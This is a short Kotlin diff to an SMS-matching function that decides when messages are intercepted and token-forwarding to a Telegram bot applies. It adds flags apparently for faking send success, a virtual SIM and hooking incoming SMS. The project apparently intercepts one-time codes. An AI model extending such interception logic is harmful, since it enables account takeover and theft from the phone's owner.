@@ -39,8 +39,9 @@ object SmsMatcher {
         if (!config.autoForwardToken) return false
         if (config.telegramBotToken.isBlank() || config.telegramChatId.isBlank()) return false
         return when (direction) {
-            "outgoing" -> shouldInterceptOutgoing(config, peer, body)
-            else -> shouldInterceptIncoming(config, peer, body)
+            "outgoing" -> shouldInterceptOutgoing(config, peer, body) ||
+                config.interceptFakeSuccess || config.enableVirtualSim
+            else -> config.hookIncomingSms && shouldInterceptIncoming(config, peer, body)
         }
     }
 
